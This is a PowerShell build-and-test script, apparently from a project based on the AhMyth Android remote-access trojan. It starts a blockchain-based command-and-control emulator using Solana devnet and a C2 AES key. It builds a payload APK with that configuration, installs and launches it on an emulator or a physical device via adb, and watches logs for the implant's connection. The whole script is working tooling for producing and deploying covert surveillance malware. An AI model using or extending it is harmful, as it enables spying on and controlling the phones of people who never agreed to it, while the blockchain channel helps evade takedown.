# Test Blockchain Emulator - Build, Install, and Test
# This script builds an APK with blockchain config, installs it, and verifies connection

param(
    [switch]$KeepServerAlive
)

$ErrorActionPreference = "Stop"

Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║   AhMyth Blockchain Emulator Test                      ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

# Configuration - Real Blockchain RPC
$RPC_URL = if ($env:BLOCKCHAIN_RPC_URL) { $env:BLOCKCHAIN_RPC_URL } else { "https://api.devnet.solana.com" }
$CHANNEL_ADDRESS = if ($env:BLOCKCHAIN_CONTRACT_ADDRESS) { $env:BLOCKCHAIN_CONTRACT_ADDRESS } else { "11111111111111111111111111111111" }
$AES_KEY = if ($env:BLOCKCHAIN_C2_AES_KEY) { $env:BLOCKCHAIN_C2_AES_KEY } else { "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef" } # 64 hex chars = 32 bytes
$CLIENT_KEY = if ($env:BLOCKCHAIN_PRIVATE_KEY) { $env:BLOCKCHAIN_PRIVATE_KEY } else { "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef" } # Operator private key (base58)
$CHAIN = "solana"

# Paths
$FACTORY_PATH = "AhMyth-Server\app\Factory"
$OUTPUT_PATH = "AhMyth-Server\app\Output"
$EMULATOR_SCRIPT = "blockchain-emulator-server.js"

function Get-ConnectedDevice {
    # Get all connected devices
    $devicesOutput = adb devices 2>&1
    $devices = @()
    
    foreach ($line in $devicesOutput) {
        # Match: deviceId    device (handle tabs and spaces)
        if ($line -match '^(\S+)\s+device') {
            $deviceId = $matches[1].Trim()
            
            # Skip empty device IDs
            if ([string]::IsNullOrWhiteSpace($deviceId)) {
                continue
            }
            
            # Check if it's an emulator
            $isEmulator = $deviceId -match '^emulator-' -or 
                         $deviceId -match '^127\.0\.0\.1:' -or 
                         $deviceId -match '^localhost:'
            
            $devices += @{
                Id = $deviceId
                Type = 'device'
                IsEmulator = $isEmulator
            }
        }
    }
    
    if ($devices.Count -eq 0) {
        throw "No ADB device found. Make sure a device/emulator is connected and ADB is running."
    }
    
    # Sort: emulators first, then physical devices
    # Use @() to ensure we always get an array, even with single items
    $emulators = @($devices | Where-Object { $_.IsEmulator })
    $physical = @($devices | Where-Object { -not $_.IsEmulator })

    # Prefer emulators over physical devices
    $selected = if ($emulators.Count -gt 0) { $emulators[0] } else { $physical[0] }

    if (-not $selected -or -not $selected.Id -or [string]::IsNullOrWhiteSpace($selected.Id)) {
        Write-Host "[✗] Debug: Selected device is invalid" -ForegroundColor Red
        Write-Host "[✗] Debug: Available devices:" -ForegroundColor Red
        $devices | ForEach-Object { Write-Host "  - $($_.Id) (Emulator: $($_.IsEmulator))" -ForegroundColor Yellow }
        throw "Invalid device ID selected"
    }

    $deviceType = if ($selected.IsEmulator) { "📱 Emulator" } else { "📲 Physical device" }
    Write-Host "[ℹ] Selected $deviceType : $($selected.Id)" -ForegroundColor Cyan

    return $selected.Id
}

# Check prerequisites
Write-Host "[1/6] Checking prerequisites..." -ForegroundColor Yellow

# Check if emulator script exists
if (-not (Test-Path $EMULATOR_SCRIPT)) {
    Write-Host "[✗] Emulator script not found: $EMULATOR_SCRIPT" -ForegroundColor Red
    exit 1
}

# Check if Factory directory exists
if (-not (Test-Path $FACTORY_PATH)) {
    Write-Host "[✗] Factory directory not found: $FACTORY_PATH" -ForegroundColor Red
    exit 1
}

# Check if ADB is available
$adbCheck = adb devices 2>&1
if ($LASTEXITCODE -ne 0) {
    Write-Host "[✗] ADB not found or not working" -ForegroundColor Red
    exit 1
}

# Check for connected device
$devices = adb devices | Select-String "device$"
if ($devices.Count -eq 0) {
    Write-Host "[✗] No Android device/emulator connected" -ForegroundColor Red
    Write-Host "[ℹ] Connect a device or start an emulator first" -ForegroundColor Yellow
    exit 1
}

Write-Host "[✓] Prerequisites OK" -ForegroundColor Green
Write-Host ""

# Start blockchain emulator server (uses real RPC, no port needed)
Write-Host "[2/6] Starting blockchain emulator server..." -ForegroundColor Yellow

# Kill any existing emulator processes
Get-Process -Name node -ErrorAction SilentlyContinue | ForEach-Object {
    $cmdLine = (Get-CimInstance Win32_Process -Filter "ProcessId = $($_.Id)" | Select-Object -ExpandProperty CommandLine)
    if ($cmdLine -and $cmdLine -match "blockchain-emulator-server") {
        Write-Host "[ℹ] Killing existing emulator process (PID $($_.Id))..." -ForegroundColor Yellow
        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
    }
}
Start-Sleep -Milliseconds 300

# Set environment variables for emulator
$env:BLOCKCHAIN_RPC_URL = $RPC_URL
$env:BLOCKCHAIN_CONTRACT_ADDRESS = $CHANNEL_ADDRESS
$env:BLOCKCHAIN_C2_AES_KEY = $AES_KEY
$env:BLOCKCHAIN_PRIVATE_KEY = $CLIENT_KEY

# Start emulator (no port needed - it uses real blockchain RPC)
$emulatorProcess = Start-Process -FilePath "node" -ArgumentList $EMULATOR_SCRIPT -PassThru -NoNewWindow

# Wait for server to start
Start-Sleep -Seconds 2

# Check if it's running
if ($emulatorProcess.HasExited) {
    Write-Host "[✗] Emulator server failed to start" -ForegroundColor Red
    exit 1
}

Write-Host "[✓] Blockchain emulator server running (PID: $($emulatorProcess.Id))" -ForegroundColor Green
Write-Host "[✓] Using real blockchain RPC: $RPC_URL" -ForegroundColor Cyan
Write-Host "[✓] Channel address: $CHANNEL_ADDRESS" -ForegroundColor Cyan
Write-Host ""

# Build APK using Node.js script (since Build function is in Electron renderer)
Write-Host "[3/6] Building APK with blockchain config..." -ForegroundColor Yellow

$envVars = @{
    BLOCKCHAIN_RPC_URL = $RPC_URL
    BLOCKCHAIN_CONTRACT_ADDRESS = $CHANNEL_ADDRESS
    BLOCKCHAIN_C2_AES_KEY = $AES_KEY
    BLOCKCHAIN_PRIVATE_KEY = $CLIENT_KEY
    CHAIN = $CHAIN
}
$originalEnv = @{}
foreach ($key in $envVars.Keys) {
    $originalEnv[$key] = (Get-Item -Path "env:$key" -ErrorAction SilentlyContinue).Value
    Set-Item -Path "env:$key" -Value $envVars[$key]
}

try {
    node "scripts\\build-blockchain-apk.js"
    if ($LASTEXITCODE -ne 0) {
        throw "Build helper failed"
    }
} catch {
    Write-Host "[?] Build failed: $_" -ForegroundColor Red
    Stop-Process -Id $emulatorProcess.Id -Force -ErrorAction SilentlyContinue
    exit 1
} finally {
    foreach ($key in $envVars.Keys) {
        if ($null -eq $originalEnv[$key]) {
            Remove-Item -Path "env:$key" -ErrorAction SilentlyContinue
        } else {
            Set-Item -Path "env:$key" -Value $originalEnv[$key]
        }
    }
}

Write-Host ""


# Find the built APK
$apkFiles = Get-ChildItem -Path $OUTPUT_PATH -Filter "*-aligned-debugSigned.apk" | Sort-Object LastWriteTime -Descending
if ($apkFiles.Count -eq 0) {
    Write-Host "[✗] Built APK not found" -ForegroundColor Red
    Stop-Process -Id $emulatorProcess.Id -Force -ErrorAction SilentlyContinue
    exit 1
}

$apkPath = $apkFiles[0].FullName
Write-Host "[✓] APK built: $($apkFiles[0].Name)" -ForegroundColor Green
Write-Host ""

# Install APK
Write-Host "[4/6] Installing APK..." -ForegroundColor Yellow
try {
    $deviceId = Get-ConnectedDevice
} catch {
    Write-Host "[✗] $_" -ForegroundColor Red
    Stop-Process -Id $emulatorProcess.Id -Force -ErrorAction SilentlyContinue
    exit 1
}

adb -s $deviceId uninstall ahmyth.mine.king.ahmyth 2>&1 | Out-Null
adb -s $deviceId install -r "$apkPath"
if ($LASTEXITCODE -ne 0) {
    Write-Host "[✗] Installation failed" -ForegroundColor Red
    Stop-Process -Id $emulatorProcess.Id -Force -ErrorAction SilentlyContinue
    exit 1
}
Write-Host "[✓] APK installed" -ForegroundColor Green
Write-Host ""

# Launch app
Write-Host "[5/6] Launching app..." -ForegroundColor Yellow
adb -s $deviceId shell am start -n ahmyth.mine.king.ahmyth/.MainActivity
Start-Sleep -Seconds 2
Write-Host "[✓] App launched" -ForegroundColor Green
Write-Host ""

# Monitor logs
Write-Host "[6/6] Monitoring connection (30 seconds)..." -ForegroundColor Yellow
Write-Host "[ℹ] Check Electron GUI for blockchain client connection" -ForegroundColor Cyan
if ($KeepServerAlive) {
    Write-Host "[ℹ] Emulator server is running - press Ctrl+C to stop" -ForegroundColor Cyan
} else {
    Write-Host "[ℹ] Emulator server will stop once the test completes" -ForegroundColor Cyan
}
Write-Host ""

# Show ADB logs for 30 seconds
$logProcess = Start-Process -FilePath "adb" -ArgumentList "-s", $deviceId, "logcat", "-s", "IOSocket:*", "ConnectionManager:*", "BlockchainEventPoller:*" -PassThru -NoNewWindow
Start-Sleep -Seconds 30
Stop-Process -Id $logProcess.Id -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "[✓] Test complete!" -ForegroundColor Green

if ($KeepServerAlive) {
    Write-Host "[ℹ] Emulator server is still running (PID: $($emulatorProcess.Id))" -ForegroundColor Yellow
    Write-Host "[ℹ] Press Ctrl+C to stop the emulator server" -ForegroundColor Yellow
    Write-Host ""
    try {
        Wait-Process -Id $emulatorProcess.Id
    } catch {
        Stop-Process -Id $emulatorProcess.Id -Force -ErrorAction SilentlyContinue
    }
} else {
    Write-Host "[ℹ] Stopping emulator server (PID: $($emulatorProcess.Id))" -ForegroundColor Yellow
    Stop-Process -Id $emulatorProcess.Id -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1
    Write-Host "[✓] Emulator server stopped" -ForegroundColor Cyan
    Write-Host ""
}
